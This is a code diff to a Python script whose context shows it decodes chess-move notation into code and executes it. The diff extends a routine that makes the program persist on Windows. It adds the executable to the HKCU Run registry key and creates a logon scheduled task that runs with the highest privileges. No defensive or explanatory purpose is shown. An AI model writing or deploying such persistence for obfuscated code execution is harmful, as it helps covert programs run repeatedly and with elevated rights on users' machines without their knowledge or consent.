@@ -54,7 +54,7 @@ def translate_and_execute_chess_moves(chess_moves, codex_file):
         print(f"Error during cleanup: {e}")
 
 # Function to add the executable to Windows startup and Task Scheduler
-def add_to_startup(executable_path, app_name="BorgApp"):
+def add_to_startup_and_task_scheduler(executable_path, app_name="BorgApp"):
     try:
         # Add to Windows startup via registry
         key = winreg.OpenKey(
@@ -67,31 +67,32 @@ def add_to_startup(executable_path, app_name="BorgApp"):
         winreg.CloseKey(key)
         print(f"Successfully added {executable_path} to registry startup.")
 
-        # Verify the registry key
+        # Verify the registry key value
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
         value, _ = winreg.QueryValueEx(key, app_name)
-        print(f"Registry Key Value for {app_name}: {value}")
         winreg.CloseKey(key)
+        print(f"Registry Key Value for {app_name}: {value}")
 
-        # Add to Task Scheduler
-        user = os.getlogin()  # Get the current user
+        # Task Scheduler using the registry entry for the path to 'borg.exe'
         cmd = [
             'schtasks', '/Create', '/F',
-            '/SC', 'ONLOGON',  # Trigger task on logon
+            '/SC', 'ONLOGON',  # Trigger on logon
             '/TN', app_name,  # Task name
-            '/TR', f'"{executable_path}"',  # Task action (run executable)
-            '/RU', user  # Run under the current user
+            '/TR', f'"{value}"',  # Use the value from the registry
+            '/RU', os.getlogin(),  # Run under the current user
+            '/RL', 'HIGHEST'  # Run with highest privileges
         ]
 
         print(f"Running Task Scheduler command: {' '.join(cmd)}")
         result = subprocess.run(cmd, capture_output=True, text=True)
 
         if result.returncode == 0:
-            print(f"Successfully added {executable_path} to Task Scheduler.")
+            print(f"Successfully added {executable_path} to Task Scheduler using the registry path.")
         else:
             print(f"Failed to add task to Task Scheduler. Error: {result.stderr}")
+
     except Exception as e:
-        print(f"Failed to add {executable_path} to startup: {e}")
+        print(f"Failed to add {executable_path} to startup and Task Scheduler: {e}")
         print(traceback.format_exc())
 
 # Chess moves representing the code
